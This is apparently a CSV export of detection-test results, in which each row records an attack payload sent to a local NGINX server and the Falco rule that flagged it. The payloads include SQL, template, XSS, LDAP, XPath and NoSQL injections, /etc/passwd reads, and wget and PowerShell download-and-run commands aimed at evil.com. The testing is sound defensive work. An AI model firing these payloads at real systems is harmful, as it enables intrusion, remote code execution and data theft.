"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_010` |
| **Name** | Simple UNION injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' UNION SELECT 1 --`
- **Encoded**: `'%20UNION%20SELECT%201%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 11:36:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_BOOL_010-1772192176126-6ltubp pattern_id=SQLI_BOOL_010 uri=/?q='%20UNION%20SELECT%201%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_BOOL_010-1772192176126-6ltubp pattern_id=SQLI_BOOL_010 uri=/?q='%20UNION%20SELECT%201%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:16.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_BOOL_010-1772192176126-6ltubp pattern_id=SQLI_BOOL_010 uri=/?q='%20UNION%20SELECT%201%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[046_SQLI_BOOL_010]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_THYME_001` |
| **Name** | Thymeleaf expression injection |
| **Category** | SSTI |
| **Subcategory** | thymeleaf |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `__${T(java.lang.Runtime).getRuntime().exec(""id"")}__`
- **Encoded**: `__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 11:36:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Spring4Shell attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1772192191041-9l1ez pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1772192191041-9l1ez pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1

**Falco Log Entry**:
```
11:36:31.000000000: Critical [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1772192191041-9l1ez pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1
```","2","test_e2e_with_logs[686_SSTI_THYME_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_STACK_007` |
| **Name** | Web shell creation |
| **Category** | SQLI |
| **Subcategory** | stacked_query |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'; SELECT INTO OUTFILE '/var/www/html/shell.php' 'PHP_SHELL_CODE'; --`
- **Encoded**: `%27%3B%20SELECT%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%20%27PHP_SHELL_CODE%27%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 11:36:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_007-1772192197179-347gjn pattern_id=SQLI_STACK_007 uri=/?q=%27%3B%20SELECT%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%20%27PHP_SHELL_CODE%27%3B%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_007-1772192197179-347gjn pattern_id=SQLI_STACK_007 uri=/?q=%27%3B%20SELECT%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%20%27PHP_SHELL_CODE%27%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:37.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_007-1772192197179-347gjn pattern_id=SQLI_STACK_007 uri=/?q=%27%3B%20SELECT%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fshell.php%27%20%27PHP_SHELL_CODE%27%3B%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[105_SQLI_STACK_007]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_002` |
| **Name** | MongoDB not-equal operator bypass |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$ne"": null}`
- **Encoded**: `%7B%22%24ne%22%3A%20null%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 11:36:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1772192163534-3uvmc8 pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1772192163534-3uvmc8 pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1

**Falco Log Entry**:
```
11:36:03.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1772192163534-3uvmc8 pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1
```","2","test_e2e_with_logs[610_EMRG_MONGO_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_014` |
| **Name** | PostgreSQL information schema enumeration |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (1)=(SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%user%') --`
- **Encoded**: `%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 11:36:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1772192194171-hqofuf pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1772192194171-hqofuf pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:34.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1772192194171-hqofuf pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[080_SQLI_ERROR_014]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_FUNC_004` |
| **Name** | XPath standalone substring function probe |
| **Category** | XPATH |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `substring(//user,1,1)`
- **Encoded**: `substring%28%2F%2Fuser%2C1%2C1%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 11:36:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_004-1772192188549-veplh pattern_id=XPATH_FUNC_004 uri=/?q=substring%28%2F%2Fuser%2C1%2C1%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_004-1772192188549-veplh pattern_id=XPATH_FUNC_004 uri=/?q=substring%28%2F%2Fuser%2C1%2C1%29 client=127.0.0.1

**Falco Log Entry**:
```
11:36:28.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_004-1772192188549-veplh pattern_id=XPATH_FUNC_004 uri=/?q=substring%28%2F%2Fuser%2C1%2C1%29 client=127.0.0.1
```","2","test_e2e_with_logs[547_XPATH_FUNC_004]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_006` |
| **Name** | Apache site configuration access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `/etc/apache2/sites-available/000-default.conf`
- **Encoded**: `%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 11:36:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1772192166571-6tcn6 pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1772192166571-6tcn6 pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1

**Falco Log Entry**:
```
11:36:06.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1772192166571-6tcn6 pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1
```","2","test_e2e_with_logs[234_PATH_ABS_006]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_TWIG_001` |
| **Name** | Twig file read |
| **Category** | SSTI |
| **Subcategory** | twig |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{{""/etc/passwd""|file_excerpt(1,30)}}`
- **Encoded**: `%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 11:36:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=SSTI_TWIG_001-1772192192545-hq39ko pattern_id=SSTI_TWIG_001 uri=/?q=%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=SSTI_TWIG_001-1772192192545-hq39ko pattern_id=SSTI_TWIG_001 uri=/?q=%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
11:36:32.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=SSTI_TWIG_001-1772192192545-hq39ko pattern_id=SSTI_TWIG_001 uri=/?q=%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[689_SSTI_TWIG_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_016` |
| **Name** | URL encoded script tag XSS |
| **Category** | XSS |
| **Subcategory** | reflected |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%3Cscript%3Ealert('XSS')%3C/script%3E`
- **Encoded**: `%253Cscript%253Ealert%28%27XSS%27%29%253C%2Fscript%253E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 11:36:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_016-1772192185143-0vz2jr pattern_id=XSS_REFL_016 uri=/?q=%253Cscript%253Ealert%28%27XSS%27%29%253C%2Fscript%253E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_016-1772192185143-0vz2jr pattern_id=XSS_REFL_016 uri=/?q=%253Cscript%253Ealert%28%27XSS%27%29%253C%2Fscript%253E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:25.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_016-1772192185143-0vz2jr pattern_id=XSS_REFL_016 uri=/?q=%253Cscript%253Ealert%28%27XSS%27%29%253C%2Fscript%253E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[221_XSS_REFL_016]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_ATTR_002` |
| **Name** | LDAP Attribute Injection via objectClass |
| **Category** | LDAP |
| **Subcategory** | attribute_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `)(objectClass=person`
- **Encoded**: `)(objectClass=person`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 11:36:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Attribute injection attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_002-1772192173549-9fs5wm pattern_id=LDAP_ATTR_002 uri=/?q=)(objectClass=person client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_002-1772192173549-9fs5wm pattern_id=LDAP_ATTR_002 uri=/?q=)(objectClass=person client=127.0.0.1

**Falco Log Entry**:
```
11:36:13.000000000: Warning [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_002-1772192173549-9fs5wm pattern_id=LDAP_ATTR_002 uri=/?q=)(objectClass=person client=127.0.0.1
```","2","test_e2e_with_logs[406_LDAP_ATTR_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BACK_002` |
| **Name** | Malicious download via backticks |
| **Category** | CMDI |
| **Subcategory** | backtick |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``wget http://evil.com/backdoor``
- **Encoded**: `%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 11:36:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_002-1772192191628-m4zsjw pattern_id=CMD_BACK_002 uri=/?q=%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_002-1772192191628-m4zsjw pattern_id=CMD_BACK_002 uri=/?q=%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:31.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_002-1772192191628-m4zsjw pattern_id=CMD_BACK_002 uri=/?q=%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[315_CMD_BACK_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMDI_PS_001` |
| **Name** | PowerShell IEX command injection |
| **Category** | CMDINJ |
| **Subcategory** | powershell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a')`
- **Encoded**: `%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 11:36:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772192204164-4dbqof pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772192204164-4dbqof pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1

**Falco Log Entry**:
```
11:36:44.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772192204164-4dbqof pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1
```","2","test_e2e_with_logs[653_CMDI_PS_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_005` |
| **Name** | Newline character XSS bypass |
| **Category** | XSS |
| **Subcategory** | filter_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<script
src=data:,alert('XSS')>`
- **Encoded**: `%3Cscript%0Asrc%3Ddata%3A%2Calert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~70000ms
- **Timestamp**: 11:36:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_005-1772192167589-x13c8l pattern_id=XSS_BYPASS_005 uri=/?q=%3Cscript%0Asrc%3Ddata%3A%2Calert%28%27XSS%27%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_005-1772192167589-x13c8l pattern_id=XSS_BYPASS_005 uri=/?q=%3Cscript%0Asrc%3Ddata%3A%2Calert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:07.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_005-1772192167589-x13c8l pattern_id=XSS_BYPASS_005 uri=/?q=%3Cscript%0Asrc%3Ddata%3A%2Calert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[152_XSS_BYPASS_005]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_FUNC_006` |
| **Name** | XPath translate function injection |
| **Category** | XPATH |
| **Subcategory** | function_abuse |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `translate(//user[1]/name,'abc','ABC')`
- **Encoded**: `translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 11:36:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1772192191056-pg88o pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1772192191056-pg88o pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1

**Falco Log Entry**:
```
11:36:31.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1772192191056-pg88o pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1
```","2","test_e2e_with_logs[549_XPATH_FUNC_006]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_004` |
| **Name** | PostgreSQL sleep function |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `pg_sleep(5)`
- **Encoded**: `pg_sleep%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~93000ms
- **Timestamp**: 11:35:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_004-1772192144537-57d7ne pattern_id=SQLI_TIME_004 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_004-1772192144537-57d7ne pattern_id=SQLI_TIME_004 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:35:44.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_004-1772192144537-57d7ne pattern_id=SQLI_TIME_004 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[109_SQLI_TIME_004]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BIT_002` |
| **Name** | Bitwise AND injection |
| **Category** | SQLI |
| **Subcategory** | bitwise_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `1 & 1`
- **Encoded**: `1%20%26%201`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `NONE` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[025_SQLI_BIT_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
